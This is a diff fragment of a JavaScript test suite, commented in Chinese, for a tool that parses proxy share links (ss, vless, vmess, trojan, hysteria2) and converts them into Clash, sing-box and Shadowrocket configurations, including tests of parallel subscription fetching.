+  const g = yaml.load(T.genClash(false, up, pol, LIB, {}, SET))['proxy-groups'].find(x => x.name === 'AI')
+  ok(g && JSON.stringify(g.proxies) === '["🚀 节点选择"]', 'Clash：strict 目标不存在时同样回落到节点选择')
+}
+
+sec('70. 地区识别：国旗与文字冲突')
+{
+  ok(T.regionOf('🇺🇲 美国 01') === 'us', '🇺🇲 当美国（两面旗长得一样，机场常挑错）')
+  ok(T.regionOf('🇨🇳 台湾 01') === 'tw' && T.regionOf('🇨🇳 香港 02') === 'hk' && T.regionOf('🇨🇳 澳门 01') === 'mo', '🇨🇳 配港澳台文字时以文字为准')
+  ok(T.regionOf('🇨🇳 上海 01') === 'cn' && T.regionOf('🇨🇳 回国专线') === 'cn', '🇨🇳 配大陆城市仍是中国')
+  ok(T.regionOf('🇯🇵 日本-美国中转') === 'jp', '其它国旗照旧优先，不被文字带偏')
+  ok(T.regionOf('🇭🇰 香港 01') === 'hk' && T.regionOf('美国 01') === 'us', '常规写法不受影响')
+}
+
+sec('71. ss 链接的插件')
+{
+  const P1 = T.parseShareLine(`ss://${B64('aes-128-gcm:pwd')}@o1.example.com:8388/?plugin=${encodeURIComponent('obfs-local;obfs=http;obfs-host=www.bing.com')}#Obfs`)
+  ok(P1 && P1.plugin === 'obfs' && T.parseFlow(P1['plugin-opts']).mode === 'http' && T.parseFlow(P1['plugin-opts']).host === 'www.bing.com', 'obfs-local → Clash 的 obfs + mode/host')
+  const P2 = T.parseShareLine(`ss://${B64('aes-128-gcm:pwd')}@o2.example.com:8388/?plugin=${encodeURIComponent('v2ray-plugin;mode=websocket;host=v.example.com;path=/v;tls')}#V2`)
+  ok(P2 && P2.plugin === 'v2ray-plugin', 'v2ray-plugin 保留')
+  const d = yaml.load(T.genClash(false, namedOf(feedOf([`ss://${B64('aes-128-gcm:pwd')}@o2.example.com:8388/?plugin=${encodeURIComponent('v2ray-plugin;mode=websocket;host=v.example.com;path=/v;tls')}#V2`])), P, LIB, {}, SET)).proxies[0]
+  ok(d['plugin-opts'].tls === true && d['plugin-opts'].host === 'v.example.com' && d['plugin-opts'].path === '/v' && d['plugin-opts'].mode === 'websocket', 'plugin-opts 的 tls 是布尔，host / path / mode 齐全')
+  ok(T.parseShareLine(`ss://${B64('aes-128-gcm:pwd')}@o3.example.com:8388/?plugin=${encodeURIComponent('shadow-tls;host=x.example.com')}#U`) === null, '认不出的插件整条不要（不带插件直连必然超时）')
+  ok(T.parseShareLine(`ss://${B64('aes-128-gcm:pwd')}@o4.example.com:8388/?plugin=${encodeURIComponent('obfs-local;obfs=http;obfs-host=a\\;b.example.com')}#E`) &&
+     T.parseFlow(T.parseShareLine(`ss://${B64('aes-128-gcm:pwd')}@o4.example.com:8388/?plugin=${encodeURIComponent('obfs-local;obfs=http;obfs-host=a\\;b.example.com')}#E`)['plugin-opts']).host === 'a;b.example.com', 'SIP003 的反斜杠转义')
+  const n1 = namedOf(feedOf([`ss://${B64('aes-128-gcm:pwd')}@o1.example.com:8388/?plugin=${encodeURIComponent('obfs-local;obfs=tls;obfs-host=www.bing.com')}#Obfs`]))[0]
+  const s1 = T.toSB(n1)
+  ok(s1.plugin === 'obfs-local' && s1.plugin_opts === 'obfs=tls;obfs-host=www.bing.com', 'sing-box：plugin + plugin_opts')
+  const s2 = T.toSB(namedOf(feedOf([`ss://${B64('aes-128-gcm:pwd')}@o2.example.com:8388/?plugin=${encodeURIComponent('v2ray-plugin;mode=websocket;host=v.example.com;path=/v;tls')}#V2`]))[0])
+  ok(s2.plugin === 'v2ray-plugin' && s2.plugin_opts === 'mode=websocket;tls;host=v.example.com;path=/v', 'sing-box：v2ray-plugin 的参数')
+  const st = { up: 'a', upName: 'A', raw: 'ST', region: 'jp', kv: { name: 'ST', type: 'ss', server: 's.example.com', port: '443', cipher: 'aes-128-gcm', password: 'p', plugin: 'shadow-tls', 'plugin-opts': '{ host: x.example.com, password: p, version: 3 }' } }
+  const stN = namedOf([st])
+  ok(T.toSB(stN[0]) === null, 'sing-box 不支持的插件（shadow-tls）节点剔除')
+  sbOk('剔除后无悬空', T.genSB(stN, P, LIB, OWN, SET))
+  const link = T.shareLink(n1)
+  ok(/[?&]plugin=obfs-local%3Bobfs%3Dtls%3Bobfs-host%3Dwww\.bing\.com/.test(link), '导出分享链接带上插件参数')
+  const back = T.parseShareLine(link)
+  ok(back && back.plugin === 'obfs' && T.parseFlow(back['plugin-opts']).mode === 'tls', '导出再导入，插件不丢')
+  const sl = T.shareLink(namedOf(feedOf([`ss://${B64('aes-256-gcm:>>>???~~~')}@x.example.com:8388#B`]))[0])
+  ok(/^[A-Za-z0-9_-]+$/.test(sl.slice(5, sl.indexOf('@'))) && T.unquote(T.parseShareLine(sl).password) === '>>>???~~~', 'ss 的 userinfo 用 URL 安全的 base64（标准 base64 的 / 会截断主机部分），导回来密码不变')
+}
+
+sec('72. ss 链接 userinfo 的百分号编码')
+{
+  const key = '4HTB0Qp+Z0BbXeITcnX/lw=='
+  const a = T.parseShareLine(`ss://2022-blake3-aes-128-gcm:${encodeURIComponent(key)}@o.example.com:8388#P`)
+  ok(a && T.unquote(a.cipher) === '2022-blake3-aes-128-gcm' && T.unquote(a.password) === key, 'SIP002 明文写法（2022-blake3 推荐）解出 %2B %2F %3D')
+  const b = T.parseShareLine(`ss://${encodeURIComponent(B64('aes-256-gcm:password'))}@o.example.com:8388#Q`)
+  ok(b && T.unquote(b.cipher) === 'aes-256-gcm' && T.unquote(b.password) === 'password', 'base64 的 padding 被编码成 %3D 也能解')
+  const c = T.parseShareLine('ss://' + encodeURIComponent(B64('aes-256-gcm:pw@o.example.com:8388')) + '#Old')
+  ok(c && T.unquote(c.server) === 'o.example.com', '整串 base64 的老格式同样先解码')
+}
+
+sec('73. httpupgrade / xhttp 的传输参数')
+{
+  const hu = namedOf(feedOf([`vless://${UUID0}@u1.example.com:443?security=tls&sni=u1.example.com&type=httpupgrade&path=%2Fup&host=up.example.com#HU`]))[0]
+  const cd = yaml.load(T.genClash(false, [hu], P, LIB, {}, SET)).proxies[0]
+  ok(cd.network === 'ws' && cd['ws-opts']['v2ray-http-upgrade'] === true && cd['ws-opts'].path === '/up' && cd['ws-opts'].headers.Host === 'up.example.com',
+    'Clash：httpupgrade 写成 ws + v2ray-http-upgrade: true，path / Host 都在')
+  const so = T.toSB(hu)
+  ok(so && JSON.stringify(so.transport) === '{"type":"httpupgrade","path":"/up","host":"up.example.com"}', 'sing-box：{type:httpupgrade, path, host}')
+  ok(!T.genSR(false, [hu], [], LIB, {}, SET).includes(hu.name + ' ='), 'Shadowrocket 不按 ws 硬连（和以前一样跳过）')
+  ok(/[?&]type=httpupgrade/.test(T.shareLink(hu)) && /[?&]path=%2Fup/.test(T.shareLink(hu)), '分享链接导出 type=httpupgrade')
+  // mihomo 原生写法（机场 YAML 里的 ws + v2ray-http-upgrade）同样转成 httpupgrade
+  const y = T.splitFeed('proxies:\n  - { name: Y, type: vless, server: y.example.com, port: 443, uuid: ' + UUID0 + ', tls: true, network: ws, ws-opts: { path: /y, headers: { Host: y.example.com }, v2ray-http-upgrade: true } }').nodes[0]
+  ok(T.toSB({ name: 'Y', kv: y }).transport.type === 'httpupgrade', '机场 YAML 里的 v2ray-http-upgrade 也认')
+  const xh = namedOf(feedOf([`vless://${UUID0}@u2.example.com:443?security=reality&pbk=${PKX}&sid=01&fp=chrome&sni=www.bing.com&type=xhttp&path=%2Fxh&host=xh.example.com&mode=packet-up#XH`]))[0]
+  const xd = yaml.load(T.genClash(false, [xh], P, LIB, {}, SET)).proxies[0]
+  ok(xd.network === 'xhttp' && xd['xhttp-opts'].path === '/xh' && xd['xhttp-opts'].host === 'xh.example.com' && xd['xhttp-opts'].mode === 'packet-up', 'Clash：xhttp-opts 带上 path / host / mode')
+  ok(T.toSB(xh) === null, 'sing-box 不支持 xhttp，节点剔除')
+  sbOk('xhttp 剔除后无悬空', T.genSB([{ ...xh, region: 'jp' }], P, LIB, OWN, SET))
+  const xs = T.shareLink(xh)
+  ok(/[?&]type=xhttp/.test(xs) && /[?&]path=%2Fxh/.test(xs) && /[?&]mode=packet-up/.test(xs), '分享链接导出 xhttp 参数')
+}
+
+sec('74. 块式 YAML：列表项与父键同缩进')
+{
+  const blk = [
+    'proxies:',
+    '- name: BlockV',
+    '  type: vless',
+    '  server: b.example.com',
+    '  port: 443',
+    `  uuid: ${UUID0}`,
+    '  alpn:',
+    '  - h2',
+    '  - http/1.1',
+    '  tls: true',
+    '  servername: www.bing.com   # 伪装域名',
+    '  client-fingerprint: chrome',
+    '  reality-opts:',
+    `    public-key: ${PKX}`,
+    "    short-id: '0888'",
+    '- name: BlockH2',
+    '  type: vmess',
+    '  server: h.example.com',
+    '  port: 443',
+    `  uuid: ${UUID0}`,
+    '  cipher: auto',
+    '  tls: true',
+    '  network: h2',
+    '  h2-opts:',
+    '    host:',
+    '      - h.example.com',
+    '    path: /h2',
+    'proxy-groups: []',
+  ].join('\n')
+  const f = T.splitFeed(blk)
+  ok(f.nodes.length === 2, `同缩进列表不再截断节点（解析出 ${f.nodes.length} 个）`)
+  const v = f.nodes[0]
+  ok(v && v.tls === 'true' && v.servername === 'www.bing.com' && /short-id: '0888'/.test(v['reality-opts'] || ''), '列表后面的 tls / servername / reality-opts 都在，行尾注释被剥掉')
+  const d = yaml.load(T.genClash(false, namedOf(f.nodes.map(p => ({ up: 'a', upName: 'A', raw: p._name, kv: p, region: 'other' }))), P, LIB, {}, SET)).proxies
+  ok(JSON.stringify(d[0].alpn) === '["h2","http/1.1"]', 'alpn 收成列表')
+  ok(d[0]['reality-opts']['short-id'] === '0888', 'reality-opts 完整')
+  ok(JSON.stringify(d[1]['h2-opts'].host) === '["h.example.com"]' && d[1]['h2-opts'].path === '/h2', '更深缩进的列表同样收成列表')
+  ok(T.toSB({ name: 'H2', kv: f.nodes[1] }).transport.host[0] === 'h.example.com', 'sing-box 的 http transport host 是数组')
+  // 映射里的纯量带逗号：放进 flow 写法要加引号，不然被切成两个字段
+  const c = T.collectFlow(['    path: /a,b', '    Host: h.example.com'], 0, 2)
+  ok(T.parseFlow(c.flow).path === '/a,b', '块里带逗号的值挪进 flow 写法时加引号')
+}
+
+sec('75. hysteria2 链接：多端口、省略端口、user:pass')
+{
+  const m = T.parseShareLine('hysteria2://user:pass@m.example.com:443,20000-30000/?sni=m.example.com#Multi')
+  ok(m && m.port === '443' && T.unquote(m.ports) === '443,20000-30000', '多端口：port 取第一个，ports 带全部')
+  ok(m && T.unquote(m.password) === 'user:pass', 'user:pass 整串是密码（userpass 认证），不再只剩 user')
+  const dp = T.parseShareLine('hysteria2://pwd@d.example.com/?sni=d.example.com#Default')
+  ok(dp && dp.port === '443', '省略端口时默认 443')
+  const v6 = T.parseShareLine('hy2://pwd@[2001:db8::9]:20000-20010/?sni=v6.example.com#V6')
+  ok(v6 && T.unquote(v6.server) === '2001:db8::9' && v6.port === '20000' && T.unquote(v6.ports) === '20000-20010', 'IPv6 加多端口')
+  ok(T.parseShareLine('hysteria2://pwd@x.example.com:443,abc/?#Bad') === null, '端口段有非法字符时整条不要')
+  const d = yaml.load(T.genClash(false, namedOf(feedOf(['hysteria2://user:pass@m.example.com:443,20000-30000/?sni=m.example.com#Multi'])), P, LIB, {}, SET)).proxies[0]
+  ok(d.port === 443 && d.ports === '443,20000-30000' && d.password === 'user:pass', 'Clash：port 数字、ports 字符串、密码完整')
+}
+
+sec('76. 一条坏链接不拖垮整个机场')
+{
+  const lines = [
+    `vless://${UUID0}@g1.example.com:443?security=tls&sni=g1.example.com&type=ws&path=%2F100%25#Bad`,
+    `vless://${UUID0}@g2.example.com:443?security=tls&sni=g2.example.com&type=ws&path=%2Fok#Good`,
+  ]
+  let got = null, err = ''
+  try { got = T.feedParse(lines.join('\n'), null, { id: 'a', name: 'A' }) } catch (e) { err = e.message }
+  ok(!err, 'path=%2F100%25 不再抛 URIError' + (err ? '：' + err : ''))
+  ok(got && got.nodes.length === 2 && T.parseFlow(got.nodes[0].kv['ws-opts']).path === '/100%', '坏的那条照样解析（path 保持 /100%），好的一条不受影响')
+  const al = T.parseShareLine('vless://' + UUID0 + '@x.example.com:443?security=tls&alpn=h2%25#x')
+  ok(al && JSON.stringify(T.parseFlow('{ a: ' + al.alpn + ' }').a) === '["h2%"]', 'alpn 的二次解码同样不抛（h2% 原样保留）')
+  const r = await apiCall('/api/parse-share', { link: lines[0] })
+  ok(r.status !== 500 && r.body.ok, `/api/parse-share 不再 500（${r.status}）`)
+}
+
+sec('77. 自建节点的分享链接')
+{
+  const ws = { name: 'WS', type: 'vless', s: 'w.example.com', p: 443, u: UUID0, sni: 'w.example.com', net: 'ws', path: '/ray', host: 'cdn.example.com', flow: '' }
+  const l = T.shareLink({ name: 'WS', own: true, o: ws })
+  ok(/security=tls/.test(l) && /type=ws/.test(l) && /path=%2Fray/.test(l) && /host=cdn\.example\.com/.test(l), 'ws 节点导出为 TLS + ws，带 path 与 host')
+  ok(!/undefined|reality|pbk=|xhttp/.test(l), '不再有 security=reality、pbk=undefined、type=xhttp')
+  const back = T.parseShareLine(l)
+  ok(back && back.network === 'ws' && back.tls === 'true' && T.parseFlow(back['ws-opts']).headers.Host === 'cdn.example.com', '导出的链接能被原样解析回来')
+  const tcp = T.shareLink({ name: 'R', own: true, o: OWN.usV2 })
+  ok(/security=reality/.test(tcp) && /pbk=/.test(tcp) && /sid=0123456789abcdef/.test(tcp) && /flow=xtls-rprx-vision/.test(tcp) && /type=tcp/.test(tcp), 'tcp Reality 照旧')
+  const xh = T.shareLink({ name: 'X', own: true, o: OWNX.x })
+  ok(/type=xhttp/.test(xh) && /security=reality/.test(xh) && !/flow=/.test(xh), 'xhttp Reality 不带 flow')
+}
+
+sec('78. 机场节点导出分享链接的传输参数')
+{
+  const vm = o => namedOf(feedOf(['vmess://' + B64(JSON.stringify({ v: '2', add: 'vm.example.com', port: '443', id: UUID0, aid: '0', ...o }))]))[0]
+  const dec = l => JSON.parse(Buffer.from(l.slice(8), 'base64').toString('utf8'))
+  const g = dec(T.shareLink(vm({ ps: 'G', net: 'grpc', path: 'svc', tls: 'tls' })))
+  ok(g.net === 'grpc' && g.path === 'svc', 'vmess grpc 的 serviceName 放回 path')
+  const h = dec(T.shareLink(vm({ ps: 'H', net: 'h2', path: '/h2', host: 'h2.example.com', tls: 'tls' })))
+  ok(h.net === 'h2' && h.path === '/h2' && h.host === 'h2.example.com', 'vmess h2 的 host / path')
+  const hv = namedOf(feedOf([`vless://${UUID0}@v.example.com:443?security=tls&sni=v.example.com&type=h2&path=%2Fh&host=hh.example.com#V`]))[0]
+  const hl = T.shareLink(hv)
+  ok(/type=h2/.test(hl) && /path=%2Fh/.test(hl) && /host=hh\.example\.com/.test(hl), 'vless h2 的 path / host')
+  const gv = namedOf(feedOf([`trojan://p@t.example.com:443?sni=t.example.com&type=grpc&serviceName=gs#TG`]))[0]
+  ok(/serviceName=gs/.test(T.shareLink(gv)), 'trojan grpc 的 serviceName')
+  // 导出再导入：传输层一致
+  for (const n of [hv, gv]) {
+    const b = T.parseShareLine(T.shareLink(n))
+    ok(b && b.network === n.kv.network && JSON.stringify(T.parseFlow(b['h2-opts'] || b['grpc-opts'])) === JSON.stringify(T.parseFlow(n.kv['h2-opts'] || n.kv['grpc-opts'])), `导出再导入传输层不变（${n.kv.network}）`)
+  }
+}
+
+sec('79. 订阅源并行拉取')
+{
+  const src = fs.readFileSync(require('path').join(__dirname, '..', 'worker.js'), 'utf8')
+  ok(/const UP_TIMEOUT = 8000/.test(src) && /const UP_BUDGET = 20000/.test(src), '单次请求 8 秒、单个机场 20 秒封顶')
+  ok(/AbortSignal\.timeout\(ms \|\| UP_TIMEOUT\)/.test(src), '超时由调用方传入，默认 8 秒')
+  ok(/await Promise\.all\(ups\.map\(pull\)\)/.test(src), '各机场并行')
+  // 真跑一遍：第一个机场慢、第二个快，节点顺序仍按订阅源顺序，而且总耗时接近最慢的那个而不是相加
+  const KV2 = new Map(), starts = []
+  const CONF2 = { get: async (k, t) => KV2.has(k) ? (t === 'json' ? JSON.parse(KV2.get(k)) : KV2.get(k)) : null, put: async (k, v) => { KV2.set(k, v) }, delete: async k => { KV2.delete(k) } }
+  const body = nm => `  - {name: "${nm}", type: ss, server: 1.2.3.4, port: 443, cipher: aes-128-gcm, password: x}`
+  const fk = async (u) => {
+    starts.push({ u, t: Date.now() })
+    await new Promise(r => setTimeout(r, u.includes('slow') ? 300 : 20))
+    if (u.includes('dead')) return { ok: false, status: 403, headers: { get: () => null }, text: async () => 'no' }
+    return { ok: true, status: 200, headers: { get: () => null }, text: async () => body(u.includes('slow') ? '日本-慢' : '香港-快') }
+  }
+  const mk = new Function('CONF', 'fetch', 'addEventListener', 'crypto', 'btoa', 'atob', 'TextEncoder', 'TextDecoder',
+    fs.readFileSync(require('path').join(__dirname, '..', 'worker.js'), 'utf8') + '\n;return {loadNodes, kvPut}')
+  const W = mk(CONF2, fk, () => {}, require('crypto').webcrypto, x => Buffer.from(x, 'binary').toString('base64'), x => Buffer.from(x, 'base64').toString('binary'), TextEncoder, TextDecoder)
+  await W.kvPut('upstreams', [{ id: 's', name: '慢', url: 'https://slow.example.com/s', enabled: true }, { id: 'd', name: '坏', url: 'https://dead.example.com/d', enabled: true }, { id: 'f', name: '快', url: 'https://fast.example.com/f', enabled: true }])
+  const t0 = Date.now()
+  const d = await W.loadNodes(true, null)
+  const cost = Date.now() - t0
+  ok(d.nodes.map(n => n.raw).join() === '日本-慢,香港-快', '节点按订阅源顺序，不按谁先拉完：' + d.nodes.map(n => n.raw).join())
+  ok(starts.find(s => s.u.includes('fast')).t - starts.find(s => s.u.includes('slow')).t < 150, '快的机场不用等慢的拉完才开始')
+  ok(cost < 300 + 20 * 5 + 250, `总耗时接近最慢的一家（${cost}ms），不是逐家相加`)
+  ok(d.errors.length === 1 && d.errors[0].id === 'd' && /HTTP 403/.test(d.errors[0].msg), '失败的机场照常记错误，其余不受影响')
+  ok(starts.filter(s => s.u.includes('dead')).length === 5, '失败的机场内部仍按 UA 顺序逐个试')
+}
+
+sec('80. trojan 密码含冒号')
+{
+  const t = T.parseShareLine('trojan://pa:ss:word@c.example.com:443?sni=c.example.com#Colon')
+  ok(t && T.unquote(t.password) === 'pa:ss:word', '密码不再在第一个冒号处截断')
+  const n = namedOf(feedOf(['trojan://pa:ss:word@c.example.com:443?sni=c.example.com#Colon']))[0]
+  ok(T.unquote(T.parseShareLine(T.shareLink(n)).password) === 'pa:ss:word', '导出再导入一致')
+  ok(T.toSB(n).password === 'pa:ss:word', 'sing-box 拿到完整密码')
+  ok(T.unquote(T.parseShareLine('anytls://a:b@x.example.com:443?sni=x.example.com#A').password) === 'a:b', 'anytls 同理')
+}
+
+sec('81. vmess 的 tcp + HTTP 伪装')
+{
+  const raw = 'vmess://' + B64(JSON.stringify({ v: '2', ps: 'TH', add: 'th.example.com', port: '80', id: UUID0, aid: '0', net: 'tcp', type: 'http', host: 'a.example.com,b.example.com', path: '/p1,/p2', tls: '' }))
+  const n = namedOf(feedOf([raw]))[0]
+  const d = yaml.load(T.genClash(false, [n], P, LIB, {}, SET)).proxies[0]
+  ok(d.network === 'http' && JSON.stringify(d['http-opts'].path) === '["/p1","/p2"]' && JSON.stringify(d['http-opts'].headers.Host) === '["a.example.com","b.example.com"]',
+    'Clash：network: http，http-opts 的 path 与 headers.Host 都是列表')
+  ok(T.toSB(n) === null, 'sing-box 没有这种伪装，节点剔除')
+  sbOk('剔除后无悬空', T.genSB([{ ...n, region: 'jp' }], P, LIB, OWN, SET))
+  ok(!T.genSR(false, [n], [], LIB, {}, SET).includes(n.name + ' ='), 'Shadowrocket 同样剔除')
+  const j = JSON.parse(Buffer.from(T.shareLink(n).slice(8), 'base64').toString('utf8'))
+  ok(j.net === 'tcp' && j.type === 'http' && j.host === 'a.example.com,b.example.com' && j.path === '/p1,/p2', '分享链接导出伪装参数')
+}
+
+sec('82. hysteria2 端口跳跃带到 sing-box')
+{
+  const o = T.ownToSB({ name: 'H', type: 'hysteria2', s: 'h.example.com', p: 8443, u: 'p', sni: 's', ports: '50000-50020' })
+  ok(JSON.stringify(o.server_ports) === '["50000:50020"]', '自有节点：50000-50020 → ["50000:50020"]')
+  const n = namedOf(feedOf(['hysteria2://p@m.example.com:443,20000-30000/?sni=m.example.com#M']))[0]
+  ok(JSON.stringify(T.toSB(n).server_ports) === '["443:443","20000:30000"]', '机场节点：多段端口逐段转换')
+  ok(JSON.stringify(T.sbPorts('1000/2000-2010, x, 70000')) === '["1000:1000","2000:2010"]', '/ 分隔与非法段')
+}
+
+sec('83. Clash 的监听端口与局域网')
+{
+  const d = yaml.load(T.genClash(false, up, P, LIB, OWN, SET))
+  ok(d['mixed-port'] === 7890 && !('port' in d) && !('socks-port' in d), '只保留 mixed-port: 7890（以前 port 与 socks-port 都是 7890，裸内核 bind 失败）')
+  ok(d['allow-lan'] === false, 'allow-lan 关闭（裸内核不设认证时等于开放代理）')
+}
+
+sec('84. 订阅解析：proxies 前面的 providers 段')
+{
+  const text = [
+    'proxy-providers:',
+    '  p1:',
+    '    type: http',
+    '    url: "https://sub.example.com/x"',
+    'rule-providers:',
+    '  r1:',
+    '    type: http',
+    'listeners:',
+    '  - { name: L1, type: ss, server: 0.0.0.0, port: 1, cipher: aes-128-gcm, password: x }',
+    'proxies:',
+    '  - { name: P1, type: trojan, server: p.example.com, port: 443, password: x, sni: p.example.com }',
+    'rules:',
+    '  - MATCH,DIRECT',
+    '# 剩余流量：100 GB',
+  ].join('\n')
+  const r = T.splitFeed(text)
+  ok(r.nodes.length === 1 && r.nodes[0]._name === 'P1', 'providers / listeners 在前面时不再提前结束，proxies 照常解析')
+  ok(r.notes.length === 0, 'proxies 之后遇到 rules 仍然停止扫描')
+  const pre = T.splitFeed(['rules:', '  - DOMAIN-SUFFIX,x.example.com,DIRECT', '  - {name: TRAP, type: ss, server: b.example.com, port: 443, cipher: aes-128-gcm, password: x}',
+    'proxies:', '  - {name: P2, type: ss, server: c.example.com, port: 443, cipher: aes-128-gcm, password: x}'].join('\n'))
+  ok(pre.nodes.length === 1 && pre.nodes[0]._name === 'P2', 'rules 排在 proxies 前面时整段跳过，不当节点')
 }
 
 console.log(`\n${'='.repeat(46)}\n通过 ${pass} · 失败 ${fail}\n${'='.repeat(46)}`)
